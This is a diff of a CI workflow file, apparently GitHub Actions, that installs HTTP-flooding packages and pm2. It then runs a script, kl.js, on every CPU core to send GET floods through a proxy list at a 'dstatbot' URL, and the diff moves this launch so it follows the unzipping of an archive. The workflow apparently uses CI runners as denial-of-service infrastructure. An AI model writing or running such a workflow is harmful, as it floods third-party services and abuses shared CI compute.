@@ -39,8 +39,7 @@ jobs:
         run: |
           npm install hpack colors chalk@4 user-agents random-referer cluster request
           npm install -g pm2
-          pm2 start kl.js -i max --interpreter node -- GET https://c1.dstatbot.win/OloAdEUR 700 4 120 proxy.txt
-
+          
 
       
       
@@ -49,6 +48,8 @@ jobs:
           
           unzip Fc-main.zip
           cd Fc-main
+          pm2 start kl.js -i max --interpreter node -- GET https://c1.dstatbot.win/iQVayrB2 700 4 120 proxy.txt
+          
            
           
           
